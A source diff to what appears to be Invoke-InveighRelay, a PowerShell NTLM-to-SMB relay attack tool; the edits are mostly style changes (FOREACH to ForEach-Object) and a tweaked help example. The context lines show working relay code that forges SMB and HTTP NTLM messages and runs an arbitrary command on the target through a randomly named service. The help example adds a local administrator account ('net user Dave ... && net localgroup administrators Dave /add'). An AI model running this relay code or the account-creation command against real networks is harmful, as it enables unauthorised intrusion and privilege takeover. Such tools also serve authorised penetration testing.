@@ -39,7 +39,7 @@ Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication ty
 IP address of system to target for SMB relay.
 
 .PARAMETER SMBRelayCommand
-Command to execute on SMB relay target.
+Command to execute on SMB relay target. Use PowerShell character escapes where necessary.
 
 .PARAMETER SMBRelayUsernames
 Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format. 
@@ -76,7 +76,7 @@ Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
 
 .EXAMPLE
-Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Winter2016 /add && net localgroup administrators Dave /add"
+Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  
 
 .EXAMPLE
@@ -389,7 +389,7 @@ if($inveigh.status_output)
 $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |Select-Object -expand id
 $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
 $process_ID = $process_ID -replace "-00-00",""
-[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}
+[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[CHAR][CONVERT]::toint16($_,16)}
 
 # Begin ScriptBlocks
 
@@ -422,7 +422,7 @@ $shared_basic_functions_scriptblock =
 
         $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
         $string_data = $string_data -replace "-00",""
-        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $string_data = $string_data.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
         return $string_extract
     }
@@ -482,13 +482,13 @@ $SMB_relay_challenge_scriptblock =
                     $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                     $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 34))
                     $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
-                    $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 45))
                     $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
-                    $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 104))
                     $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
-                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
                     [array]::Reverse($SMB_netbios_length)
                     
                     [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
@@ -558,25 +558,25 @@ $SMB_relay_response_scriptblock =
 
         $SMB_length_1 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 12))
         $SMB_length_1 = $SMB_length_1 -replace "-00-00",""
-        $SMB_length_1 = $SMB_length_1.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_length_1 = $SMB_length_1.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_length_2 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 8))
         $SMB_length_2 = $SMB_length_2 -replace "-00-00",""
-        $SMB_length_2 = $SMB_length_2.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_length_2 = $SMB_length_2.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_length_3 = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 4))
         $SMB_length_3 = $SMB_length_3 -replace "-00-00",""
-        $SMB_length_3 = $SMB_length_3.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_length_3 = $SMB_length_3.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_NTLMSSP_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
         $SMB_NTLMSSP_length = $SMB_NTLMSSP_length -replace "-00-00",""
-        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_NTLMSSP_length = $SMB_NTLMSSP_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 16))
         $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
-        $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_blob_length = $SMB_blob_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 27))
         $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
-        $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_byte_count = $SMB_byte_count.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 86))
         $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
-        $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_netbios_length = $SMB_netbios_length.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         [array]::Reverse($SMB_length_1)
         [array]::Reverse($SMB_length_2)
         [array]::Reverse($SMB_length_3)
@@ -653,17 +653,17 @@ $SMB_relay_execute_scriptblock =
 
         $SMB_relay_failed = $false
         $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
-        $SMB_service_random = [String]::Join("00-", (1..20 | ForEach-Object {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
+        $SMB_service_random = [String]::Join("00-", (1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
         $SMB_service = $SMB_service_random -replace "-00",""
         $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
-        $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_service = $SMB_service.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
         $SMB_service_random += '00-00-00'
-        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_referent_ID_bytes = [String](1..4 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
-        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
-        [System.Text.Encoding]::UTF8.GetBytes($SMBRelayCommand) | ForEach-Object { $SMB_relay_command += "{0:X2}-00-" -f $_ }
+        [System.Text.Encoding]::UTF8.GetBytes($SMBRelayCommand) | ForEach-Object{ $SMB_relay_command += "{0:X2}-00-" -f $_ }
 
         if([bool]($SMBRelayCommand.length%2))
         {
@@ -674,7 +674,7 @@ $SMB_relay_execute_scriptblock =
             $SMB_relay_command += '00-00-00-00'
         }    
         
-        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
         $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
         $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
@@ -951,19 +951,19 @@ $HTTP_scriptblock =
         $HTTP_timestamp = Get-Date
         $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
         $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
-        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $HTTP_timestamp = $HTTP_timestamp.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
 
         if($Inveigh.challenge)
         {
             $HTTP_challenge = $Inveigh.challenge
             $HTTP_challenge_bytes = $Inveigh.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
-            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         }
         else
         {
             $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
             $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
-            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | ForEach-Object{ [CHAR][CONVERT]::toint16($_,16)}
         }
 
         $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge) |Out-Null
